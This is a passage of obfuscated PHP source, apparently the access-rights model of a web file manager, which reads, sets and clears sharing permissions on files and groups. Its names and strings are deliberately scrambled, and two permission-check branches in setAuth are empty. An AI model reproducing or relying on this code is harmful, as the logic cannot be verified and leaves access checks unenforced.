($ƒÇ™ïÃ  && $©ñîƒ¡º[$Ó¡È›£[730]] == $Ó¡È›£[1961]) { $úÎÆﬂ¢ﬁ = $íîçÃª»[$Ó¡È›£[730]] == $Ó¡È›£[1961] ? 1 : 0; $this->shareFileMeta($êÀàπÓó[$Ó¡È›£[467]], $úÎÆﬂ¢ﬁ); $this->removeByFile($êÀàπÓó[$Ó¡È›£[467]]); } return $ƒÇ™ïÃ ; } private function removeByFile($¬ ª˝Çá) { $û◊°ÊÁ‘ =& $_SERVER[ëæªã÷]; $∆æÃèåŒ = Model($û◊°ÊÁ‘[805])->where(array($û◊°ÊÁ‘[467] => $¬ ª˝Çá))->field($û◊°ÊÁ‘[403])->select(); $ëÛı∂∆ï = array_to_keyvalue($∆æÃèåŒ, $û◊°ÊÁ‘[12], $û◊°ÊÁ‘[403]); $àíêﬁêÎ = array($û◊°ÊÁ‘[403] => array($û◊°ÊÁ‘[7], $ëÛı∂∆ï), $û◊°ÊÁ‘[493] => 1); $∆æÃèåŒ = $this->where($àíêﬁêÎ)->field($û◊°ÊÁ‘[488])->select(); if (empty($∆æÃèåŒ)) { return; } $Å§ œú¡ = array_to_keyvalue($∆æÃèåŒ, $û◊°ÊÁ‘[12], $û◊°ÊÁ‘[488]); $this->remove($Å§ œú¡); } private function shareFileMeta($ﬁ˜¬É∑˛, $ñ„ÈÉÓ∆ = null) { $Àˆ†ÖªÏ =& $_SERVER[ëæªã÷]; $´ïúóê® = array($Àˆ†ÖªÏ[467] => $ﬁ˜¬É∑˛, $Àˆ†ÖªÏ[105] => $Àˆ†ÖªÏ[1966]); if (is_null($ñ„ÈÉÓ∆)) { return Model($Àˆ†ÖªÏ[1967])->where($´ïúóê®)->find(); } $´ïúóê®[$Àˆ†ÖªÏ[378]] = $ñ„ÈÉÓ∆; Model($Àˆ†ÖªÏ[1967])->add($´ïúóê®, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\x72\143\x65\137\141\165\x74\150"; public function getAuth($ÒÑ‘’π) { $ÜÜˆ‹Ω¡ =& $_SERVER[ëæªã÷]; $…ÏñÿÅÆ = $this->sourceAuthSelect($ÒÑ‘’π); $Ê‚æá¶ü = array(); $˝Ù‘Ê¡∂ = array(); $ÉÙÔ¥ß∏ = 2 << 25; foreach ($…ÏñÿÅÆ as $¢Û•Ê€Å) { $ﬂàêÑÛè = Model($ÜÜˆ‹Ω¡[507])->listData($¢Û•Ê€Å[$ÜÜˆ‹Ω¡[1897]]); if (!$ﬂàêÑÛè) { continue; } $Ê‚æá¶ü[] = $¢Û•Ê€Å; $´ÄçÍçÖ = 0; if ($¢Û•Ê€Å[$ÜÜˆ‹Ω¡[412]] == SourceModel::TYPE_GROUP) { $´ÄçÍçÖ = $ÉÙÔ¥ß∏ * 2; } if ($¢Û•Ê€Å[$ÜÜˆ‹Ω¡[412]] == SourceModel::TYPE_USER) { $´ÄçÍçÖ = $ÉÙÔ¥ß∏; } if ($¢Û•Ê€Å[$ÜÜˆ‹Ω¡[412]] == SourceModel::TYPE_USER && $¢Û•Ê€Å[$ÜÜˆ‹Ω¡[504]] == $ÜÜˆ‹Ω¡[200]) { $´ÄçÍçÖ = 0; } $˝Ù‘Ê¡∂[] = $ﬂàêÑÛè[$ÜÜˆ‹Ω¡[414]] + $´ÄçÍçÖ; } array_multisort($˝Ù‘Ê¡∂, SORT_DESC, $Ê‚æá¶ü); return $Ê‚æá¶ü; } public function sourceAuthSelect($›¶Øàïù) { $ù“¨ß‰¯ =& $_SERVER[ëæªã÷]; static $Ä¡ ÁÛ¯ = array(); $ÔéêãØÄ = is_array($›¶Øàïù) ? !1 : !0; if ($ÔéêãØÄ) { $›¶Øàïù = array($›¶Øàïù); } $£·¯ƒ„Ü = array(); foreach ($›¶Øàïù as $ëèÁ•˚Ë) { if (isset($Ä¡ ÁÛ¯[$ëèÁ•˚Ë])) { $£·¯ƒ„Ü[$ëèÁ•˚Ë] = $Ä¡ ÁÛ¯[$ëèÁ•˚Ë]; } } if (count($£·¯ƒ„Ü) == count($›¶Øàïù)) { return $ÔéêãØÄ ? $£·¯ƒ„Ü[$›¶Øàïù[0]] : $£·¯ƒ„Ü; } $∑˜ç…€ = $ù“¨ß‰¯[1968]; $‚ÊÓ∂Ê≤ = array($ù“¨ß‰¯[403] => array($ù“¨ß‰¯[7], $›¶Øàïù)); $‹çﬂí∫º = $this->field($∑˜ç…€)->order($ù“¨ß‰¯[401])->where($‚ÊÓ∂Ê≤)->select(); $⁄ìÙ¶™” = array_to_keyvalue_group($‹çﬂí∫º, $ù“¨ß‰¯[403]); foreach ($›¶Øàïù as $ëèÁ•˚Ë) { $Ä¡ ÁÛ¯[$ëèÁ•˚Ë] = $⁄ìÙ¶™”[$ëèÁ•˚Ë] ? $⁄ìÙ¶™”[$ëèÁ•˚Ë] : array(); } if ($ÔéêãØÄ) { return $‹çﬂí∫º; } return $⁄ìÙ¶™”; } public function setAuth($”å≤‚◊°, $‡ß∫¯†€) { $≈Æ≠‹ïñ =& $_SERVER[ëæªã÷]; $ã≥Ø†˝Ë = Model($≈Æ≠‹ïñ[1301])->sourceInfo($”å≤‚◊°); if (!$ã≥Ø†˝Ë) { return !1; } if ($ã≥Ø†˝Ë[$≈Æ≠‹ïñ[412]] != SourceModel::TYPE_GROUP) { return !1; } $õ˚˜∆è = 1; $´’π€åÁ = $ã≥Ø†˝Ë[$≈Æ≠‹ïñ[504]]; if ($´’π€åÁ != $õ˚˜∆è) { $åÿ£ãÍå = array($≈Æ≠‹ïñ[1796] => $´’π€åÁ); $®Ω≥–ÆÖ = Model($≈Æ≠‹ïñ[1885])->field($≈Æ≠‹ïñ[1628])->where($åÿ£ãÍå)->select(); $®Ω≥–ÆÖ = array_to_keyvalue($®Ω≥–ÆÖ, $≈Æ≠‹ïñ[12], $≈Æ≠‹ïñ[1628]); } $Ò›©µÒ≤ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ä±ã‰Ìñ = array(); foreach ($‡ß∫¯†€ as $∏—˘™éù) { if (!in_array($∏—˘™éù[$≈Æ≠‹ïñ[412]], $Ò›©µÒ≤)) { show_json(LNG($≈Æ≠‹ïñ[1969]), !1); } if ($´’π€åÁ != $õ˚˜∆è) { if ($∏—˘™éù[$≈Æ≠‹ïñ[412]] == SourceModel::TYPE_GROUP) { } if ($∏—˘™éù[$≈Æ≠‹ïñ[504]] != 0 && !in_array($∏—˘™éù[$≈Æ≠‹ïñ[504]], $®Ω≥–ÆÖ)) { } } if ($∏—˘™éù[$≈Æ≠‹ïñ[504]] == 0) { $∏—˘™éù[$≈Æ≠‹ïñ[412]] = SourceModel::TYPE_USER; } $ä±ã‰Ìñ[] = array($≈Æ≠‹ïñ[403] => $”å≤‚◊°, $≈Æ≠‹ïñ[412] => intval($∏—˘™éù[$≈Æ≠‹ïñ[412]]), $≈Æ≠‹ïñ[504] => intval($∏—˘™éù[$≈Æ≠‹ïñ[504]]), $≈Æ≠‹ïñ[1897] => intval($∏—˘™éù[$≈Æ≠‹ïñ[1897]]) ? intval($∏—˘™éù[$≈Æ≠‹ïñ[1897]]) : 0, $≈Æ≠‹ïñ[1951] => intval($∏—˘™éù[$≈Æ≠‹ïñ[1951]]) ? intval($∏—˘™éù[$≈Æ≠‹ïñ[1951]]) : -1); } $this->where(array($≈Æ≠‹ïñ[418] => $”å≤‚◊°))->delete(); $this->addAll($ä±ã‰Ìñ); return !0; } public function authClear($∞»ˆÑÚª) { $Å≠–Ä¯¯ =& $_SERVER[ëæªã÷]; $ÅúÜòûì = Model($Å≠–Ä¯¯[1301])->sourceInfo($∞»ˆÑÚª); $‡à£–¶ò = array($∞»ˆÑÚª); if ($ÅúÜòûì[$Å≠–Ä¯¯[411]] == $Å≠–Ä¯¯[99]) { $Ì¥ø±ﬁî = array($Å≠–Ä¯¯[584] => array($Å≠–Ä¯¯[544], $ÅúÜòûì[$Å≠–Ä¯¯[521]] . $∞»ˆÑÚª . $Å≠–Ä¯¯[545])); $‡à£–¶ò = Model($Å≠–Ä¯¯[1301])->field($Å≠–Ä¯¯[418])->where($Ì¥ø±ﬁî)->getField($Å≠–Ä¯¯[403], !0); $‡à£–¶ò[] = $∞»ˆÑÚª; } $this->where(array($Å≠–Ä¯¯[418] => array($Å≠–Ä¯¯[419], $‡à£–¶ò)))->delete(); return !0; } public function getAllChildren($ √·¬ûã) { $˚†ëœûÚ =& $_SERVER[ëæªã÷]; $≤¶„æûé = Model($˚†ëœûÚ[1301])->sourceInfo($ √·¬ûã); if ($≤¶„æûé[$˚†ëœûÚ[411]] != $˚†ëœûÚ[99]) { return $this->sourceListAuth(array($ √·¬ûã)); } if ($≤¶„æûé[$˚†ëœûÚ[412]] != SourceModel::TYPE_GROUP) { return array(); } $ŸÀéÑ˛¿ = 1; $ÒΩÎ•É∞ = array($ √·¬ûã); if ($≤¶„æûé[$˚†ëœûÚ[498]] == $˚†ëœûÚ[200] && $≤¶„æûé[$˚†ëœûÚ[504]] != $ŸÀéÑ˛¿) { $ÒΩÎ•É∞ = $this->groupChidldAllRootSource($≤¶„æûé[$˚†ëœûÚ[504]]); } $·µ¢√åﬁ = $this->field($˚†ëœûÚ[403])->group($˚†ëœûÚ[403])->select(); $·µ¢√åﬁ = array_to_keyvalue($·µ¢√åﬁ, $˚†ëœûÚ[12], $˚†ëœûÚ[403]); if (!$·µ¢√åﬁ) { return array(); } $èéüáÀ∫ = $˚†ëœûÚ[1970]; $¡Ö¨†®ô = array($˚†ëœûÚ[403] => array($˚†ëœûÚ[7], $·µ¢√åﬁ), $˚†ëœûÚ[431] => $˚†ëœûÚ[200]); $±ﬁ⁄ûˆæ = Model($˚†ëœûÚ[805])->field($èéüáÀ∫)->where($¡Ö¨†®ô)->select(); $˙—ó·ó£ = array($ √·¬ûã); foreach ($±ﬁ⁄ûˆæ as $†Î§±è˛) { foreach ($ÒΩÎ•É∞ as $√πÙÁ©¢) { $ë”Ì∞íõ = $˚†ëœûÚ[50] . $√πÙÁ©¢ . $˚†ëœûÚ[50]; $Çæ∂úà¥ = $†Î§±è˛[$˚†ëœûÚ[521]] . $†Î§±è˛[$˚†ëœûÚ[403]] . $˚†ëœûÚ[50]; if (strstr($Çæ∂úà¥, $ë”Ì∞íõ)) { $˙—ó·ó£[] = $†Î§±è˛[$˚†ëœûÚ[403]]; break; } } } return $this->sourceListAuth($˙—ó·ó£); } private function sourceListAuth($Ú∑ü§Óï) { $˝’⁄õƒÛ =& $_SERVER[ëæªã÷]; $òäÇ∏¶Ω = Model($˝’⁄õƒÛ[1301])->sourceListInfo($Ú∑ü§Óï, !0); $—ÒõÏê» = $this->sourceAuthSelect($Ú∑ü§Óï); $á·ﬂ—ŸÔ = array(); $·Ã≈”î≈ = array(); foreach ($òäÇ∏¶Ω as $ß√ÊÄŸ’) { unset($ß√ÊÄŸ’[$˝’⁄õƒÛ[454]]); unset($ß√ÊÄŸ’[$˝’⁄õƒÛ[452]]); unset($ß√ÊÄŸ’[$˝’⁄õƒÛ[414]]); unset($ß√ÊÄŸ’[$˝’⁄õƒÛ[97]]); $ÈíÏ¯Çµ = $—ÒõÏê»[$ß√ÊÄŸ’[$˝’⁄õƒÛ[403]]]; if (!$ÈíÏ¯Çµ) { continue; } $ß√ÊÄŸ’[$˝’⁄õƒÛ[1971]] = $this->authTargetInfo($ÈíÏ¯Çµ); $ß√ÊÄŸ’[$˝’⁄õƒÛ[519]] = rtrim($ß√ÊÄŸ’[$˝’⁄õƒÛ[525]], $˝’⁄õƒÛ[8]) . $˝’⁄õƒÛ[8] . ltrim($ß√ÊÄŸ’[$˝’⁄õƒÛ[519]], $˝’⁄õƒÛ[8]); $á·ﬂ—ŸÔ[] = $ß√ÊÄŸ’; $°åÏı§Œ = count(explode($˝’⁄õƒÛ[8], trim($ß√ÊÄŸ’[$˝’⁄õƒÛ[519]], $˝’⁄õƒÛ[8]))); $·Ã≈”î≈[] = $°åÏı§Œ + ($ß√ÊÄŸ’[$˝’⁄õƒÛ[33]] == $˝’⁄õƒÛ[89] ? 0 : 1000); } array_multisort($·Ã≈”î≈, SORT_ASC, $á·ﬂ—ŸÔ); return $á·ﬂ—ŸÔ; } private function groupChidldAllRootSource($ΩÕ±ì∂¬) { $£ãÛ—◊∑ =& $_SERVER[ëæªã÷]; $â£¡ÙÇ¸ = Model($£ãÛ—◊∑[1972])->groupChildrenAll($ΩÕ±ì∂¬); $√Û¬ıÓ† = array($£ãÛ—◊∑[498] => 0, $£ãÛ—◊∑[504] => array($£ãÛ—◊∑[7], $â£¡ÙÇ¸), $£ãÛ—◊∑[412] => SourceModel::TYPE_GROUP); $∏‚ §ÛÀ = Model($£ãÛ—◊∑[805])->field($£ãÛ—◊∑[403])->where($√Û¬ıÓ†)->select(); $∏‚ §ÛÀ = array_to_keyvalue($∏‚ §ÛÀ, $£ãÛ—◊∑[12], $£ãÛ—◊∑[403]); return $∏‚ §ÛÀ; } private function authTargetInfo($á¨†›⁄ï) { $äüÚ∫Áâ =& $_SERVER[ëæªã÷]; $¨˝˙ƒ•÷ = array(); $ÀÚùäéÔ = array(); $√Ã˚ëŒ‘ = 2 << 25; foreach ($á¨†›⁄ï as $ë„˝Ûóì) { $¨Ü˘Ö¯Ê = Model($äüÚ∫Áâ[507])->listData($ë„˝Ûóì[$äüÚ∫Áâ[1897]]); if (!$¨Ü˘Ö¯Ê) { continue; } if ($ë„˝Ûóì[$äüÚ∫Áâ[412]] == SourceModel::TYPE_USER) { $÷ú”Ï§Ò = Model($äüÚ∫Áâ[513])->getInfoSimpleOuter($ë„˝Ûóì[$äüÚ∫Áâ[504]]); if ($÷ú”Ï§Ò[$äüÚ∫Áâ[1628]] == $äüÚ∫Áâ[1164]) { continue; } if ($÷ú”Ï§Ò[$äüÚ∫Áâ[1628]] == $äüÚ∫Áâ[200]) { $÷ú”Ï§Ò[$äüÚ∫Áâ[32]] = LNG($äüÚ∫Áâ[1973]); } } else { $÷ú”Ï§Ò = Model($äüÚ∫Áâ[522])->getInfoSimple($ë„˝Ûóì[$äüÚ∫Áâ[504]]); } if (!$÷ú”Ï§Ò) { continue; } $÷ú”Ï§Ò[$äüÚ∫Áâ[466]] = $¨Ü˘Ö¯Ê; $¨˝˙ƒ•÷[] = $÷ú”Ï§Ò; $ãÔã„¢› = 0; if ($ë„˝Ûóì[$äüÚ∫Áâ[412]] == SourceModel::TYPE_GROUP) { $ãÔã„¢› = $√Ã˚ëŒ‘ * 2; } if ($ë„˝Ûóì[$äüÚ∫Áâ[412]] == SourceModel::TYPE_USER) { $ãÔã„¢› = $√Ã˚ëŒ‘; } if ($ë„˝Ûóì[$äüÚ∫Áâ[412]] == SourceModel::TYPE_USER && $ë„˝Ûóì[$äüÚ∫Áâ[504]] == $äüÚ∫Áâ[200]) { $ãÔã„¢› = 0; } $ÀÚùäéÔ[] = $¨Ü˘Ö¯Ê[$äüÚ∫Áâ[414]] + $ãÔã„¢›; } array_multisort($ÀÚùäéÔ, SORT_DESC, $¨˝˙ƒ•÷); return $¨˝˙ƒ•÷; } public function getAllChildrenByUser($’µ ì¢ã, $ΩÑõƒö˚) { $øﬂ¥ÚÌÚ =& $_SERVER[ëæªã÷]; $◊«Á•Ï§ = Model($øﬂ¥ÚÌÚ[538])->getInfo($ΩÑõƒö˚); if (!$ΩÑõƒö˚ || !$’µ ì¢ã || !$◊«Á•Ï§) { return array(); } $ÌÀÜåÓò = Model($øﬂ¥ÚÌÚ[1301])->sourceInfo($’µ ì¢ã); $©ˆâ†”¨ = array(); $í≠∂Ãõ± = 1; if ($ÌÀÜåÓò[$øﬂ¥ÚÌÚ[498]] == $øﬂ¥ÚÌÚ[200] && $ÌÀÜåÓò[$øﬂ¥ÚÌÚ[504]] != $í≠∂Ãõ± && $this->groupContainUser($ÌÀÜåÓò[$øﬂ¥ÚÌÚ[504]], $ΩÑõƒö˚)) { foreach ($◊«Á•Ï§[$øﬂ¥ÚÌÚ[1974]] as $ÒªÕëÏò) { $∞„÷¥‰Ü = Model($øﬂ¥ÚÌÚ[522])->getInfo($ÒªÕëÏò[$øﬂ¥ÚÌÚ[1796]]); $÷Îë—˝” = Model($øﬂ¥ÚÌÚ[538])->getInfoSimpleOuter($ΩÑõƒö˚); $÷Îë—˝”[$øﬂ¥ÚÌÚ[466]] = $ÒªÕëÏò[$øﬂ¥ÚÌÚ[414]]; if (Model($øﬂ¥ÚÌÚ[507])->authCheckAction($ÒªÕëÏò[$øﬂ¥ÚÌÚ[414]][$øﬂ¥ÚÌÚ[414]], $øﬂ¥ÚÌÚ[1816])) { continue; } $î´ÎìÏ¿ = array($øﬂ¥ÚÌÚ[32] => $øﬂ¥ÚÌÚ[1577] . $∞„÷¥‰Ü[$øﬂ¥ÚÌÚ[32]], $øﬂ¥ÚÌÚ[403] => $∞„÷¥‰Ü[$øﬂ¥ÚÌÚ[97]][$øﬂ¥ÚÌÚ[403]], $øﬂ¥ÚÌÚ[88] => KodIO::make($∞„÷¥‰Ü[$øﬂ¥ÚÌÚ[97]][$øﬂ¥ÚÌÚ[403]]), $øﬂ¥ÚÌÚ[498] => $øﬂ¥ÚÌÚ[200], $øﬂ¥ÚÌÚ[412] => $øﬂ¥ÚÌÚ[515], $øﬂ¥ÚÌÚ[33] => $øﬂ¥ÚÌÚ[548], $øﬂ¥ÚÌÚ[519] => $∞„÷¥‰Ü[$øﬂ¥ÚÌÚ[526]], $øﬂ¥ÚÌÚ[1796] => $∞„÷¥‰Ü[$øﬂ¥ÚÌÚ[1796]], $øﬂ¥ÚÌÚ[523] => $∞„÷¥‰Ü[$øﬂ¥ÚÌÚ[498]], $øﬂ¥ÚÌÚ[1971] => array($÷Îë—˝”)); $©ˆâ†”¨[$î´ÎìÏ¿[$øﬂ¥ÚÌÚ[403]]] = $î´ÎìÏ¿; } } $Óâ ∞é = array(); $πñÎŒ¯ø = $this->getAllChildren($’µ ì¢ã); foreach ($πñÎŒ¯ø as $›ºﬁ≠â) { $âÔöÌôÀ = !1; foreach ($›ºﬁ≠â[$øﬂ¥ÚÌÚ[1971]] as $£Ÿ—á∑‚) { if ($£Ÿ—á∑‚[$øﬂ¥ÚÌÚ[1628]]) { if ($£Ÿ—á∑‚[$øﬂ¥ÚÌÚ[1628]] == $ΩÑõƒö˚) { $âÔöÌôÀ = !0; break; } } if ($£Ÿ—á∑‚[$øﬂ¥ÚÌÚ[1796]]) { if ($this->groupContainUser($£Ÿ—á∑‚[$øﬂ¥ÚÌÚ[1796]], $ΩÑõƒö˚)) { $âÔöÌôÀ = !0; break; } } } if ($âÔöÌôÀ) { $Óâ ∞é[] = $›ºﬁ≠â; } $ﬁÀ£ÈØÌ = $›ºﬁ≠â[$øﬂ¥ÚÌÚ[403]]; if (isset($©ˆâ†”¨[$ﬁÀ£ÈØÌ])) { $›ºﬁ≠â[$øﬂ¥ÚÌÚ[1971]][] = $©ˆâ†”¨[$ﬁÀ£ÈØÌ][0]; $©ˆâ†”¨[$ﬁÀ£ÈØÌ] = !1; } } $©ˆâ†”¨ = array_filter(array_values($©ˆâ†”¨)); $Óâ ∞é = array_merge($©ˆâ†”¨, $Óâ ∞é); return $Óâ ∞é; } public function setAllChildrenByUser($˘ª‹—Ω˘, $©ˆ˘é¨À, $ìõ÷Ó≤◊) { $Ï…ÓïàÅ =& $_SERVER[ëæªã÷]; $ñ·ü—Îè = $this->getAllChildrenByUser($˘ª‹—Ω˘, $©ˆ˘é¨À); if (!$ìõ÷Ó≤◊ || !$ñ·ü—Îè) { return !1; } foreach ($ñ·ü—Îè as $äΩÒ›Ç˝) { $†¬†Ãì∆ = array(); foreach ($äΩÒ›Ç˝[$Ï…ÓïàÅ[1971]] as $ó≤∫®’ö) { $áÙèûÿ˝ = $ó≤∫®’ö[$Ï…ÓïàÅ[466]]; $Ò—≠µÛå = $ó≤∫®’ö[$Ï…ÓïàÅ[1628]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $©®·™™Ω = $ó≤∫®’ö[$Ï…ÓïàÅ[1628]] ? $ó≤∫®’ö[$Ï…ÓïàÅ[1628]] : $ó≤∫®’ö[$Ï…ÓïàÅ[1796]]; if ($ó≤∫®’ö[$Ï…ÓïàÅ[1628]] && $ó≤∫®’ö[$Ï…ÓïàÅ[1628]] == $©ˆ˘é¨À) { continue; } $†¬†Ãì∆[] = array($Ï…ÓïàÅ[403] => $äΩÒ›Ç˝[$Ï…ÓïàÅ[403]], $Ï…ÓïàÅ[412] => $Ò—≠µÛå, $Ï…ÓïàÅ[504] => intval($©®·™™Ω), $Ï…ÓïàÅ[1897] => isset($áÙèûÿ˝[$Ï…ÓïàÅ[401]]) ? intval($áÙèûÿ˝[$Ï…ÓïàÅ[401]]) : 0, $Ï…ÓïàÅ[1951] => isset($áÙèûÿ˝[$Ï…ÓïàÅ[1951]]) ? intval($áÙèûÿ˝[$Ï…ÓïàÅ[1951]]) : -1); } $†¬†Ãì∆[] = array($Ï…ÓïàÅ[403] => $äΩÒ›Ç˝[$Ï…ÓïàÅ[403]], $Ï…ÓïàÅ[412] => SourceModel::TYPE_USER, $Ï…ÓïàÅ[504] => intval($©ˆ˘é¨À), $Ï…ÓïàÅ[1897] => intval($ìõ÷Ó≤◊), $Ï…ÓïàÅ[1951] => -1); $this->where(array($Ï…ÓïàÅ[418] => $äΩÒ›Ç˝[$Ï…ÓïàÅ[403]]))->delete(); $this->addAll($†¬†Ãì∆); } return !0; } public function get($Ä⁄Ã¶·˜) { $™ÚÎÂ¢Ñ = $this->getSourceList(array($Ä⁄Ã¶·˜), !0); return $™ÚÎÂ¢Ñ[0]; } public function getSourceList($≈ƒ–æÆ⁄, $ñ®ÃÉƒ = false, $èØº•Â£ = false) { $ÿΩ∏˝ﬂÕ =& $_SERVER[ëæªã÷]; if (!$≈ƒ–æÆ⁄) { return array(); } $æ¨∫∫Ó” = Model($ÿΩ∏˝ﬂÕ[1301]); if (!$ñ®ÃÉƒ && count($≈ƒ–æÆ⁄) == 1) { $ñ®ÃÉƒ = array(); $ñ®ÃÉƒ[$≈ƒ–æÆ⁄[0]] = $æ¨∫∫Ó”->sourceInfo($≈ƒ–æÆ⁄[0]); } if (!$ñ®ÃÉƒ) { $∏Úø≤çË = array($ÿΩ∏˝ﬂÕ[418] => array($ÿΩ∏˝ﬂÕ[419], $≈ƒ–æÆ⁄)); $ñ®ÃÉƒ = $æ¨∫∫Ó”->field($ÿΩ∏˝ﬂÕ[1975])->where($∏Úø≤çË)->select(); $ñ®ÃÉƒ = array_to_keyvalue($ñ®ÃÉƒ, $ÿΩ∏˝ﬂÕ[403]); } $•’ÆÎÊò = $≈ƒ–æÆ⁄; foreach ($ñ®ÃÉƒ as $Ç›±Øï‡ => $äÎ©ıŒó) { $ˆÍãÚÈü = $æ¨∫∫Ó”->parentLevelArray($äÎ©ıŒó[$ÿΩ∏˝ﬂÕ[521]]); $•’ÆÎÊò = array_merge($•’ÆÎÊò, array($Ç›±Øï‡), array_reverse($ˆÍãÚÈü)); } $•’ÆÎÊò = array_values(array_unique($•’ÆÎÊò)); if (!$•’ÆÎÊò) { return array(); } $ıá˝´¬§ = $this->sourceAuthSelect($•’ÆÎÊò); $Û÷“Ã†º = array(); foreach ($•’ÆÎÊò as $ÑñÌ‡À…) { if (isset($ıá˝´¬§[$ÑñÌ‡À…])) { $Û÷“Ã†º[$ÑñÌ‡À…] = $ıá˝´¬§[$ÑñÌ‡À…]; } } $ŒŸ˛ìµ = $this->userIsRoot($èØº•Â£); $ÿãï±Ûÿ = AuthModel::authAll(); $ï–Ÿ‡á = array($ÿΩ∏˝ﬂÕ[415] => $ÿãï±Ûÿ, $ÿΩ∏˝ﬂÕ[1976] => array($ÿΩ∏˝ﬂÕ[420] => 0, $ÿΩ∏˝ﬂÕ[1802] => $ÿãï±Ûÿ, $ÿΩ∏˝ﬂÕ[421] => LNG($ÿΩ∏˝ﬂÕ[1977]), $ÿΩ∏˝ﬂÕ[1818] => $ÿΩ∏˝ﬂÕ[1978])); $Ì©Êª©ù = array(); foreach ($ñ®ÃÉƒ as $ÑñÌ‡À… => $‚∂π¸®ú) { if ($ŒŸ˛ìµ) { $Ì©Êª©ù[$ÑñÌ‡À…] = $ï–Ÿ‡á; continue; } $Ì©Êª©ù[$ÑñÌ‡À…] = $this->makeSourceAuth($‚∂π¸®ú, $Û÷“Ã†º, $èØº•Â£); } return $Ì©Êª©ù; } public function authDeepCheck($ªÜÁæÚù, $“Ê€íÎÇ = false) { $´ÖÉê›¬ =& $_SERVER[ëæªã÷]; $“Ê€íÎÇ = $“Ê€íÎÇ ? $“Ê€íÎÇ : USER_ID; $Ò⁄Ê‡¸æ = $this->makeAuthDeep($“Ê€íÎÇ); if (!in_array($ªÜÁæÚù, $Ò⁄Ê‡¸æ[$´ÖÉê›¬[1979]])) { return !1; } $˜Æﬂ¢¯Ë = array(); foreach ($Ò⁄Ê‡¸æ[$´ÖÉê›¬[1980]] as $´‰Ù¥ì· => $íÀ∆àê‘) { if (!in_array($ªÜÁæÚù, $íÀ∆àê‘)) { continue; } $˜Æﬂ¢¯Ë[] = $´‰Ù¥ì·; } if (!$˜Æﬂ¢¯Ë) { return !1; } $‰˜Å”˛§ = $˜Æﬂ¢¯Ë ? $˜Æﬂ¢¯Ë[0] : $ªÜÁæÚù; return array($´ÖÉê›¬[415] => -1, $´ÖÉê›¬[466] => array($´ÖÉê›¬[420] => $´ÖÉê›¬[1164], $´ÖÉê›¬[1802] => $´ÖÉê›¬[200], $´ÖÉê›¬[421] => LNG($´ÖÉê›¬[1981]), $´ÖÉê›¬[1818] => $´ÖÉê›¬[1982]), $´ÖÉê›¬[1983] => LNG($´ÖÉê›¬[1984]), $´ÖÉê›¬[1985] => $this->sourceAuthInfo($‰˜Å”˛§)); } protected function makeAuthDeep($π–ÛóÂÄ = false) { $äÃ˙ﬁ´« =& $_SERVER[ëæªã÷]; static $÷Ô«à Ù = array(); $π–ÛóÂÄ = $π–ÛóÂÄ ? $π–ÛóÂÄ : USER_ID; if (isset($÷Ô«à Ù[$π–ÛóÂÄ])) { return $÷Ô«à Ù[$π–ÛóÂÄ]; } $ìú“∏¯ò = Model($äÃ˙ﬁ´«[1986])->listData(); $•Ÿ–≤œÏ = array(); foreach ($ìú“∏¯ò as $„çüÌÕ¿) { if ($„çüÌÕ¿[$äÃ˙ﬁ´«[414]] == 0 && $„çüÌÕ¿[$äÃ˙ﬁ´«[1817]] == $äÃ˙ﬁ´«[99]) { $•Ÿ–≤œÏ[] = $„çüÌÕ¿[$äÃ˙ﬁ´«[401]]; } } $øè™éÜ⁄ = $this->userGroupParents($π–ÛóÂÄ); $»µÈ®ïû = array($äÃ˙ﬁ´«[412] => SourceModel::TYPE_USER, $äÃ˙ﬁ´«[504] => $π–ÛóÂÄ); if ($øè™éÜ⁄) { $»µÈ®ïû = array(array($äÃ˙ﬁ´«[412] => SourceModel::TYPE_USER, $äÃ˙ﬁ´«[504] => $π–ÛóÂÄ), array($äÃ˙ﬁ´«[412] => SourceModel::TYPE_GROUP, $äÃ˙ﬁ´«[504] => array($äÃ˙ﬁ´«[419], $øè™éÜ⁄)), $äÃ˙ﬁ´«[976] => $äÃ˙ﬁ´«[1891]); } $˙ë∆„‡® = $this->field($äÃ˙ﬁ´«[1987])->where($»µÈ®ïû)->select(); $‘°’Ÿ∫Î = array(); $ä„ÏÂä£ = array_to_keyvalue_group($˙ë∆„‡®, $äÃ˙ﬁ´«[403]); foreach ($ä„ÏÂä£ as $º…∫‡•˝ => $‡Ì Êå®) { $£’Í≈‡Æ = $this->authArrayCheck($‡Ì Êå®, $π–ÛóÂÄ); if ($£’Í≈‡Æ[$äÃ˙ﬁ´«[415]] > 0) { $‘°’Ÿ∫Î[] = $º…∫‡•˝ . $äÃ˙ﬁ´«[12]; } } if ($øè™éÜ⁄) { $âı≤◊ô± = Model($äÃ˙ﬁ´«[522]); foreach ($øè™éÜ⁄ as $Ô√éÍ›…) { $îàÕÖ°∑ = $âı≤◊ô±->getInfo($Ô√éÍ›…); if (!$îàÕÖ°∑ || !is_array($îàÕÖ°∑[$äÃ˙ﬁ´«[97]])) { continue; } $‘°’Ÿ∫Î[] = $îàÕÖ°∑[$äÃ˙ﬁ´«[97]][$äÃ˙ﬁ´«[403]]; } } $∂ñöÑ§¡ = array(); $†€Ω∞Ø« = $øè™éÜ⁄; $Œïˆ©åó = Model($äÃ˙ﬁ´«[1301]); $âı≤◊ô± = Model($äÃ˙ﬁ´«[522]); $˛”°Ó≥È = array(); $ªÍ˜ã¬· = array(); $·∏ö«‹Ù = array(); $›õ»’ÿ• = array(); if ($‘°’Ÿ∫Î) { $•â◊™†ì = $Œïˆ©åó->where(array($äÃ˙ﬁ´«[403] => array($äÃ˙ﬁ´«[419], $‘°’Ÿ∫Î)))->select(); foreach ($•â◊™†ì as $Æå∆Â‹ÿ) { $›óùÛÅ´ = $Œïˆ©åó->parentLevelArray($Æå∆Â‹ÿ[$äÃ˙ﬁ´«[521]]); $∂ñöÑ§¡ = array_merge($∂ñöÑ§¡, $›óùÛÅ´); $†€Ω∞Ø«[] = $Æå∆Â‹ÿ[$äÃ˙ﬁ´«[504]]; $˛”°Ó≥È[$Æå∆Â‹ÿ[$äÃ˙ﬁ´«[403]]] = $›óùÛÅ´; $ªÍ˜ã¬·[$Æå∆Â‹ÿ[$äÃ˙ﬁ´«[403]]] = $Æå∆Â‹ÿ[$äÃ˙ﬁ´«[504]]; } } $†€Ω∞Ø« = array_values(array_unique($†€Ω∞Ø«)); $‹Ï≈µ€Ê = $†€Ω∞Ø«; foreach ($‹Ï≈µ€Ê as $Ô√éÍ›…) { $îàÕÖ°∑ 